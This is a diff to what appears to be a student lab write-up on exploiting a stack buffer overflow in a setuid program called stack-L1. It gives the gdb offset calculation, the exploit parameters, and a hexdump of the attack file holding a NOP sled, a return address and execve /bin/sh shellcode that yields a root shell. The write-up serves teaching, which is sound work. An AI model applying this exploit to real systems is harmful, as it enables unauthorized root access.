@@ -80,7 +80,7 @@ $1 = (void *) 0xffffcb28
 gdb-peda$ p &buffer
 $2 = (char (*)[100]) 0xffffcabc
 
-Since we want to overflow buffer we need to find the distance between buffer and the top of the stack ebp we do this by.
+Since we want to overflow buffer we need to find the offset between buffer and the top of the stack ebp we do this by.
 nyuappsec@ubuntu:~$ python3
 Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
 [GCC 9.3.0] on linux
@@ -88,3 +88,22 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> hex(0xffffcb28-0xffffcabc)
 '0x6c' or 108 bits apart in the stack. 
 
+In the exploit file we edit the following values 
+start = 517-len(shellcode)   # start from len(shellcode) from the end of array
+ret = 0xffffcabc + 250       # return beyond ebp / NOP sled
+offset = 108 + 4             #ebp-&buffer+4
+
+This works because our vulnerable program has a buffer that takes up 108 bytes, we will then read the previous frames pointer and land in the return adress where
+it would without the exploit run the existing code. We want to write more than the buffer of 108 bytes to run out malicious code without running code that is already in the stack. Filling it with NOPs allows us to do this. Adding 250 bytes to the buffer gives us plenty of room to land somewhere in the NOP sled to get the return adress we want to execute the malicious code. 
+--contents of badfile--
+00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+00000070  b6 cb ff ff 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+00000080  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+000001e0  90 90 90 90 90 90 90 90  90 90 31 c0 50 68 2f 2f  |..........1.Ph//|
+000001f0  73 68 68 2f 62 69 6e 89  e3 50 53 89 e1 31 d2 31  |shh/bin..PS..1.1|
+00000200  c0 b0 0b cd 80                                    |.....|
+00000205
+#        
+stack-L1 is a setuid program so it will run what is in the buffer, because of the badfile created by the exploit; the program will run the shellcode with root permissions. 
